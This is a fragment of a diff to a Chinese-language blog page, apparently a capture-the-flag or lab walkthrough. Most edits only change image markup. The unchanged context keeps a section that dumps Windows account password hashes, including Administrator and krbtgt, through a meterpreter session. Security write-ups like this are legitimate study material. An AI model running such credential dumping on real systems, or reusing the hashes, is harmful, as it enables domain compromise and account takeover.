class="line">exploit</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032214.jpg" alt=""></p>
-<h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032215.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032214.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032215.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h2><p>需要64位shell，默认选项是32位的:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a89ac8a8b099a7578cd9698578d01fd:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d2e82d4f77310a49973793ee986b6490:::</span><br><span class="line">matthew:1104:aad3b435b51404eeaad3b435b51404ee:bcd285980e1d9b302e16875844ef6977:::</span><br><span class="line"><span class="meta">DC$</span><span class="bash">:1000:aad3b435b51404eeaad3b435b51404ee:de7392b6e8a9ce8d34209a3838249903:::</span></span><br><span class="line"><span class="meta">adfs_svc$</span><span class="bash">:5602:aad3b435b51404eeaad3b435b51404ee:d711db215c7eb570d41acc0cac98da96:::</span></span><br><span class="line"><span class="meta">ICINGA$</span><span class="bash">:9102:aad3b435b51404eeaad3b435b51404ee:af70cf6b33f1cce788138d459f676faf:::</span></span><br></pre></td></tr></table></figure>
 
